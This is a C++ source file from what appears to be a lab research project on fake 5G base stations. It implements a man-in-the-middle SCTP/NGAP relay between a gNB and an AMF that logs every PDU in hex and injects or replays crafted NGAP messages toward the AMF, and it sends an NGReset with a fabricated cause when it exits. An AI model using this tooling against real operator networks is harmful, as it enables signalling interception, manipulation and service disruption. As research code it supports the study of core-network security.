// UHM WINGS Fake Base Station Research
//
// Lab SCTP/NGAP relay:
//   gNB <-> ngap_proxy <-> AMF
//
// NGAP DATA payloads are forwarded unchanged. The existing injector menu is
// reused on the AMF-side association.

#define NGAP_INJECTOR_EMBEDDED
#include "../ngap_injector/ngap_injector.cpp"

#include <atomic>
#include <condition_variable>
#include <deque>
#include <mutex>
#include <poll.h>
#include <sys/types.h>
#include <unistd.h>

namespace {

struct proxy_config {
  std::vector<std::string> amf_addresses;
  std::vector<std::string> listen_addresses = {"0.0.0.0"};
  std::vector<std::string> amf_bind_addresses;
  int                      amf_port          = NGAP_PORT;
  int                      listen_port       = NGAP_PORT;
  int                      amf_bind_port     = 0;
  std::string              bind_interface    = "auto";
  int                      init_max_attempts = 2;
  int                      max_init_timeo_ms = 1000;
  bool                     dump_pdu_hex      = true;
};

struct amf_event {
  std::string type;
  bool        authentication_reject = false;
};

class amf_event_queue
{
public:
  void push(amf_event event)
  {
    {
      std::lock_guard lock(mutex);
      events.push_back(std::move(event));
    }
    condition.notify_all();
  }

  bool wait_for(const std::string& expected, int timeout_ms)
  {
    const std::string expected_type = expected_ngap_type_from_label(expected);
    const auto deadline = timeout_ms < 0
                              ? std::chrono::steady_clock::time_point::max()
                              : std::chrono::steady_clock::now() + std::chrono::milliseconds{timeout_ms};
    std::unique_lock lock(mutex);

    while (true) {
      while (!events.empty()) {
        amf_event event = std::move(events.front());
        events.pop_front();
        if (event.authentication_reject) {
          std::printf("NGAP proxy: received NAS Authentication Reject; aborting replay\n");
          return false;
        }
        if (event.type == expected_type) {
          return true;
        }
      }
      if (stopped) {
        return false;
      }
      if (timeout_ms < 0) {
        condition.wait(lock);
      } else if (condition.wait_until(lock, deadline) == std::cv_status::timeout) {
        return false;
      }
    }
  }

  void stop()
  {
    {
      std::lock_guard lock(mutex);
      stopped = true;
    }
    condition.notify_all();
  }

private:
  std::mutex              mutex;
  std::condition_variable condition;
  std::deque<amf_event>   events;
  bool                    stopped = false;
};

static void forward_sctp_data(int destination_fd,
                              const uint8_t* payload,
                              size_t payload_length,
                              const sctp_sndrcvinfo& info,
                              const sockaddr_storage* destination)
{
  const sockaddr* destination_address = destination == nullptr
                                            ? nullptr
                                            : reinterpret_cast<const sockaddr*>(destination);
  const socklen_t destination_length = destination == nullptr ? 0 : sockaddr_len(*destination);
  const int sent = ::sctp_sendmsg(destination_fd,
                                   payload,
                                   payload_length,
                                   const_cast<sockaddr*>(destination_address),
                                   destination_length,
                                   info.sinfo_ppid,
                                   0,
                                   info.sinfo_stream,
                                   0,
                                   0);
  if (sent < 0) {
    throw std::runtime_error(std::string("SCTP relay send failed: ") + std::strerror(errno));
  }
  if (static_cast<size_t>(sent) != payload_length) {
    throw std::runtime_error("SCTP relay sent a partial message");
  }
}

static bool receive_and_forward(int source_fd,
                                int destination_fd,
                                const char* direction,
                                bool dump_pdu_hex,
                                amf_event_queue* amf_events,
                                const sockaddr_storage* destination,
                                sockaddr_storage* observed_source,
                                bool forward_data)
{
  std::array<uint8_t, network_gateway_sctp_mtu> buffer = {};
  sctp_sndrcvinfo                             info   = {};
  int                                         flags  = 0;
  sockaddr_storage                            source = {};
  socklen_t                                   source_length = sizeof(source);
  const ssize_t received = ::sctp_recvmsg(source_fd,
                                           buffer.data(),
                                           buffer.size(),
                                           reinterpret_cast<sockaddr*>(&source),
                                           &source_length,
                                           &info,
                                           &flags);
  if (received < 0) {
    if (errno == EINTR) {
      return true;
    }
    throw std::runtime_error(std::string("SCTP relay receive failed: ") + std::strerror(errno));
  }
  if (received == 0) {
    std::printf("NGAP proxy: %s SCTP peer closed\n", direction);
    return false;
  }
  if (observed_source != nullptr && source.ss_family != 0) {
    *observed_source = source;
  }
  if ((flags & MSG_NOTIFICATION) != 0) {
    std::printf("NGAP proxy: %s SCTP notification length=%zd\n", direction, received);
    return true;
  }

  std::printf("NGAP proxy: forwarding %s DATA length=%zd stream=%u ppid=%u\n",
              direction,
              received,
              info.sinfo_stream,
              ntohl(info.sinfo_ppid));
  byte_buffer pdu{byte_buffer::fallback_allocation_tag{},
                  span<const uint8_t>{buffer.data(), static_cast<size_t>(received)}};
  if (dump_pdu_hex) {
    std::printf("NGAP proxy: %s hex=", direction);
    dump_hex(pdu);
  }

  if (observed_source != nullptr) {
    *observed_source = source;
  }
  if (forward_data) {
    forward_sctp_data(destination_fd, buffer.data(), static_cast<size_t>(received), info, destination);
  }

  if (amf_events != nullptr) {
    amf_events->push({describe_ngap_pdu(pdu), is_downlink_nas_authentication_reject(pdu)});
  }
  return true;
}

static proxy_config parse_proxy_args(int argc, char** argv)
{
  proxy_config cfg;
  CLI::App app{"Relay SCTP/NGAP between one gNB and one AMF with interactive injection"};

  app.add_option("--amf-addr,--target", cfg.amf_addresses, "AMF address or hostname")
      ->required()->expected(1, -1);
  app.add_option("--amf-port", cfg.amf_port, "AMF SCTP port")->capture_default_str();
  app.add_option("--listen-addr", cfg.listen_addresses, "Address on which the gNB connects")
      ->expected(1, -1)->capture_default_str();
  app.add_option("--listen-port", cfg.listen_port, "SCTP port on which the gNB connects")
      ->capture_default_str();
  app.add_option("--amf-bind-addr", cfg.amf_bind_addresses, "Local address for the AMF-side association")
      ->expected(1, -1);
  app.add_option("--amf-bind-port", cfg.amf_bind_port, "Local source port for the AMF-side association")
      ->capture_default_str();
  app.add_option("--bind-interface", cfg.bind_interface, "Interface for SCTP socket binding")
      ->capture_default_str();
  app.add_option("--sctp-init-max-attempts", cfg.init_max_attempts, "SCTP INIT max attempts")
      ->capture_default_str();
  app.add_option("--sctp-max-init-timeo-ms", cfg.max_init_timeo_ms, "SCTP INIT max timeout in milliseconds")
      ->capture_default_str();
  app.add_flag_function("--no-hex", [&cfg](std::int64_t) { cfg.dump_pdu_hex = false; },
                        "Do not print relayed NGAP payload hex");

  try {
    app.parse(argc, argv);
  } catch (const CLI::ParseError& e) {
    std::exit(app.exit(e));
  }

  if (cfg.listen_port < 1 || cfg.listen_port > 65535 || cfg.amf_port < 1 || cfg.amf_port > 65535) {
    throw std::runtime_error("SCTP ports must be in range 1..65535");
  }
  if (cfg.amf_bind_port < 0 || cfg.amf_bind_port > 65535) {
    throw std::runtime_error("--amf-bind-port must be in range 0..65535");
  }
  if (cfg.amf_bind_port != 0 && cfg.amf_bind_addresses.empty()) {
    throw std::runtime_error("--amf-bind-port requires --amf-bind-addr");
  }
  return cfg;
}

static void run_injection_menu(sctp_socket& amf_socket,
                               sockaddr_storage& amf_destination,
                               const proxy_config& cfg,
                               amf_event_queue& amf_events,
                               std::atomic<bool>& running,
                               std::mutex& amf_send_mutex)
{
  probe_config menu_cfg;
  menu_cfg.dump_pdu_hex = cfg.dump_pdu_hex;

  while (running.load()) {
    const auto injectable_pdus = read_injectable_ngap_pdus();
    if (!injectable_pdus.has_value()) {
      print_confirmation("NGReset", {{"gNB-ID", default_to_string(current_gnb_id)},
                                     {"RAN-Node-Name", current_ran_node_name},
                                     {"Reset-Type", "NG Interface Reset"},
                                     {"Cause", "radio-connection-with-ue-lost"}});
      std::lock_guard lock(amf_send_mutex);
      send_ngap_pdu(amf_socket, amf_destination, build_ng_reset(true, {}), "NGReset", menu_cfg);
      running.store(false);
      amf_events.stop();
      return;
    }

    for (const auto& injectable_pdu : injectable_pdus.value()) {
      if (!injectable_pdu.wait_for_amf_before_send.empty()) {
        std::printf("NGAP proxy: waiting for AMF %s before injection\n",
                    injectable_pdu.wait_for_amf_before_send.c_str());
        if (!amf_events.wait_for(injectable_pdu.wait_for_amf_before_send,
                                 injectable_pdu.amf_wait_timeout_ms)) {
          std::printf("NGAP proxy: replay sequence aborted\n");
          break;
        }
      }
      if (injectable_pdu.wait_before_send_ms > 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds{injectable_pdu.wait_before_send_ms});
      }
      if (injectable_pdu.name != nullptr) {
        std::lock_guard lock(amf_send_mutex);
        send_ngap_pdu(amf_socket, amf_destination, injectable_pdu.pdu, injectable_pdu.name, menu_cfg);
      }
    }
  }
}

static int run_proxy(const proxy_config& cfg)
{
  auto& logger = ocudulog::fetch_basic_logger("SCTP-GW");

  current_gnb_id = static_cast<uint32_t>(read_uint64_or_default("gNB ID", default_gnb_id, max_default_gnb_id));
  current_ran_node_name = read_text_token_or_default("RAN node name", default_ran_node_name);

  const auto listen_addrs = resolve_sctp_addresses(cfg.listen_addresses, cfg.listen_port, logger);
  const auto amf_addrs = resolve_sctp_addresses(cfg.amf_addresses, cfg.amf_port, logger);
  if (listen_addrs.empty() || amf_addrs.empty()) {
    throw std::runtime_error("Failed to resolve proxy listen or AMF address");
  }

  const int listen_family = has_ipv6_address(listen_addrs) ? AF_INET6 : AF_INET;
  const int amf_family = has_ipv6_address(amf_addrs) ? AF_INET6 : AF_INET;
  std::vector<sockaddr_storage> compatible_amf_addrs = amf_addrs;
  keep_compatible_destinations(compatible_amf_addrs, amf_family);

  sctp_socket_params listen_params = {};
  listen_params.if_name = "N2-PROXY-LISTEN";
  listen_params.ai_family = listen_family;
  listen_params.ai_socktype = SOCK_SEQPACKET;
  listen_params.reuse_addr = true;
  listen_params.nodelay = true;
  auto listen_socket_outcome = sctp_socket::create(listen_params);
  if (!listen_socket_outcome.has_value()) {
    throw std::runtime_error("Failed to create proxy listen socket");
  }
  sctp_socket listen_socket = std::move(listen_socket_outcome.value());
  if (!listen_socket.bindx(listen_addrs, cfg.bind_interface) || !listen_socket.listen()) {
    throw std::runtime_error("Failed to bind/listen for the gNB connection");
  }

  std::vector<sockaddr_storage> amf_bind_addrs;
  if (!cfg.amf_bind_addresses.empty()) {
    amf_bind_addrs = resolve_sctp_addresses(cfg.amf_bind_addresses, cfg.amf_bind_port, logger);
    if (amf_bind_addrs.empty()) {
      throw std::runtime_error("Failed to resolve AMF-side bind address");
    }
  }

  sctp_socket_params amf_params = {};
  amf_params.if_name = "N2-PROXY-AMF";
  amf_params.ai_family = amf_family;
  amf_params.ai_socktype = SOCK_SEQPACKET;
  amf_params.init_max_attempts = cfg.init_max_attempts;
  amf_params.max_init_timeo = std::chrono::milliseconds{cfg.max_init_timeo_ms};
  amf_params.nodelay = true;
  auto amf_socket_outcome = sctp_socket::create(amf_params);
  if (!amf_socket_outcome.has_value()) {
    throw std::runtime_error("Failed to create AMF-side SCTP socket");
  }
  sctp_socket amf_socket = std::move(amf_socket_outcome.value());
  if (!amf_bind_addrs.empty() && !amf_socket.bindx(amf_bind_addrs, cfg.bind_interface)) {
    throw std::runtime_error("Failed to bind AMF-side SCTP socket");
  }
  sctp_assoc_t amf_assoc = 0;
  if (!amf_socket.connectx(compatible_amf_addrs, amf_assoc) || amf_assoc == 0) {
    throw std::runtime_error(std::string("Failed to connect proxy to AMF: ") + std::strerror(errno));
  }

  const int gnb_fd = listen_socket.fd().value();
  sockaddr_storage gnb_peer_address = {};
  bool gnb_peer_known = false;
  std::printf("NGAP proxy: relay active; waiting for gNB on %s:%d; AMF target=%s:%d\n",
              join_strings(cfg.listen_addresses, ", ").c_str(),
              cfg.listen_port,
              join_strings(cfg.amf_addresses, ", ").c_str(),
              cfg.amf_port);
  std::printf("NGAP proxy: use the existing interactive menu to inject toward the AMF; q exits\n");

  amf_event_queue amf_events;
  std::atomic<bool> running = true;
  std::mutex amf_send_mutex;
  std::thread injection_thread([&] {
    run_injection_menu(amf_socket,
                       compatible_amf_addrs.front(),
                       cfg,
                       amf_events,
                       running,
                       amf_send_mutex);
  });

  std::array<pollfd, 2> poll_fds = {{{gnb_fd, POLLIN, 0}, {amf_socket.fd().value(), POLLIN, 0}}};
  while (running.load()) {
    const int poll_result = ::poll(poll_fds.data(), poll_fds.size(), 250);
    if (poll_result < 0) {
      if (errno == EINTR) {
        continue;
      }
      running.store(false);
      amf_events.stop();
      break;
    }
    if (poll_result == 0) {
      continue;
    }
    try {
      if ((poll_fds[0].revents & POLLIN) != 0) {
        std::lock_guard lock(amf_send_mutex);
        if (!receive_and_forward(gnb_fd, amf_socket.fd().value(), "gNB->AMF", cfg.dump_pdu_hex, nullptr, &compatible_amf_addrs.front(), &gnb_peer_address, true)) {
          running.store(false);
        } else if (gnb_peer_address.ss_family != 0) {
          gnb_peer_known = true;
        }
      }
      if ((poll_fds[1].revents & POLLIN) != 0) {
        if (!receive_and_forward(amf_socket.fd().value(), gnb_fd, "AMF->gNB", cfg.dump_pdu_hex, &amf_events, gnb_peer_known ? &gnb_peer_address : nullptr, nullptr, gnb_peer_known)) {
          running.store(false);
        }
      }
    } catch (const std::exception& e) {
      std::fprintf(stderr, "NGAP proxy: relay stopped: %s\n", e.what());
      running.store(false);
    }
    if (poll_fds[0].revents != 0 || poll_fds[1].revents != 0) {
      std::printf("NGAP proxy: poll revents gNB=0x%x AMF=0x%x\n", poll_fds[0].revents, poll_fds[1].revents);
    }
    if ((poll_fds[0].revents | poll_fds[1].revents) & (POLLERR | POLLNVAL)) {
      std::printf("NGAP proxy: stopping because SCTP poll reported an error\n");
      running.store(false);
    }

  }
  std::printf("NGAP proxy: relay loop stopping\n");
  amf_events.stop();
  if (injection_thread.joinable()) {
    injection_thread.join();
  }
  amf_socket.close();
  listen_socket.close();
  return 0;
}

} // namespace

int main(int argc, char** argv)
{
  ocudulog::init();
  try {
    return run_proxy(parse_proxy_args(argc, argv));
  } catch (const std::exception& e) {
    std::fprintf(stderr, "ngap_proxy error: %s\n", e.what());
    return 1;
  }
}
